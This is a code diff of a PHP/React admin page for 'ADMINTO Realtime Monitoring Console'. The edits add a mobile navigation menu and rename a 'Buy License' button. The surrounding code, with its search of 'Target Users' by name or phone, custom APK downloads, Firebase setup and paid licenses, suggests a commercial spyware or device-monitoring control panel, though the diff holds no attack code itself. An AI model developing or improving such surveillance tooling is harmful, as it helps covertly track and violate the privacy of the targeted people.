@@ -69,6 +69,7 @@ include_once __DIR__ . '/header.php';
       const [showChangePassModal, setShowChangePassModal] = React.useState(false);
       const [newPassInput, setNewPassInput] = React.useState('');
       const [changePassStatus, setChangePassStatus] = React.useState('');
+      const [mobileMenuOpen, setMobileMenuOpen] = React.useState(false);
 
       // Firebase Config Modal State
       const [showFirebaseModal, setShowFirebaseModal] = React.useState(false);
@@ -276,32 +277,47 @@ include_once __DIR__ . '/header.php';
           {/* Header */}
           <header className="app-header">
             <div className="navbar-content">
-              <div className="brand-logo">
-                <div className="brand-icon">🛡️</div>
-                <div>
-                  <h3 style={{ color: '#fff', fontSize: '1.2rem' }}>ADMINTO</h3>
-                  <div style={{ fontSize: '0.7rem', color: '#6366f1', textTransform: 'uppercase', letterSpacing: '1px' }}>Realtime Monitoring Console</div>
+              <div className="navbar-header-top">
+                <div className="brand-logo">
+                  <div className="brand-icon">🛡️</div>
+                  <div>
+                    <h3 style={{ color: '#fff', fontSize: '1.2rem' }}>ADMINTO</h3>
+                    <div style={{ fontSize: '0.7rem', color: '#6366f1', textTransform: 'uppercase', letterSpacing: '1px' }}>Realtime Monitoring Console</div>
+                  </div>
                 </div>
+
+                <button 
+                  className={`triple-dash-btn ${mobileMenuOpen ? 'active' : ''}`}
+                  onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
+                  aria-label="Toggle Navigation Menu"
+                  title="Menu"
+                >
+                  <span className="dash-line"></span>
+                  <span className="dash-line"></span>
+                  <span className="dash-line"></span>
+                </button>
               </div>
 
-              <input 
-                type="text" 
-                className="search-input"
-                placeholder="Search Target Users by Name, Phone, or ID..." 
-                value={search}
-                onChange={(e) => setSearch(e.target.value)}
-              />
+              <div className="search-container">
+                <input 
+                  type="text" 
+                  className="search-input"
+                  placeholder="Search Target Users by Name, Phone, or ID..." 
+                  value={search}
+                  onChange={(e) => setSearch(e.target.value)}
+                />
+              </div>
 
-              <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
-                <div className="pulse-badge active">
+              <div className={`navbar-actions ${mobileMenuOpen ? 'mobile-expanded' : ''}`}>
+                <div className="pulse-badge active nav-action-btn">
                   <span className="pulse-dot"></span>
                   <span>{adminUser?.firebaseConfig?.projectId || 'Firebase Live'}</span>
                 </div>
 
                 {isSuperAdmin && (
                   <button 
-                    className="btn-secondary"
-                    onClick={openFirebaseSettings}
+                    className="btn-secondary nav-action-btn"
+                    onClick={() => { openFirebaseSettings(); setMobileMenuOpen(false); }}
                     style={{ color: '#fbbf24', border: '1px solid rgba(251,191,36,0.3)' }}
                     title="Configure Firebase API Key, Auth Domain, Storage Bucket & App ID"
                   >
@@ -311,8 +327,8 @@ include_once __DIR__ . '/header.php';
 
                 {adminUser && (
                   <button 
-                    className="btn-secondary"
-                    onClick={() => setShowApkModal(true)}
+                    className="btn-secondary nav-action-btn"
+                    onClick={() => { setShowApkModal(true); setMobileMenuOpen(false); }}
                     style={{ color: '#10b981', border: '1px solid rgba(16,185,129,0.3)' }}
                   >
                     📲 Download Custom APK
@@ -322,7 +338,7 @@ include_once __DIR__ . '/header.php';
                 {isSuperAdmin && (
                   <a href="operator_control.php" style={{ textDecoration: 'none' }}>
                     <button 
-                      className="btn-secondary" 
+                      className="btn-secondary nav-action-btn" 
                       style={{ color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }}
                     >
                       ⚙️ Operator Console
@@ -331,26 +347,26 @@ include_once __DIR__ . '/header.php';
                 )}
 
                 {adminUser ? (
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                  <div className="nav-user-group">
                     <button 
                       type="button"
-                      className="btn-secondary"
-                      onClick={() => setShowChangePassModal(true)}
+                      className="btn-secondary nav-action-btn"
+                      onClick={() => { setShowChangePassModal(true); setMobileMenuOpen(false); }}
                       style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px' }}
                       title="Click to Change Password"
                     >
                       👤 <strong style={{ color: '#fff' }}>{adminUser.username}</strong>
                     </button>
                     <button 
-                      className="btn-secondary" 
-                      onClick={handleLogout}
+                      className="btn-secondary nav-action-btn" 
+                      onClick={() => { handleLogout(); setMobileMenuOpen(false); }}
                       style={{ color: '#f87171', border: '1px solid rgba(239, 68, 68, 0.3)' }}
                     >
                       🚪 Logout
                     </button>
                   </div>
                 ) : (
-                  <button className="btn-primary" onClick={() => setAdminUser(null)}>
+                  <button className="btn-primary nav-action-btn" onClick={() => { setAdminUser(null); setMobileMenuOpen(false); }}>
                     🔑 Sign In
                   </button>
                 )}
@@ -733,7 +749,7 @@ include_once __DIR__ . '/header.php';
                         gap: '8px'
                       }}
                     >
-                      ✈️ Buy License / Contact @tejashal
+                      🛒 Buy License
                     </button>
                   </a>
                 </div>
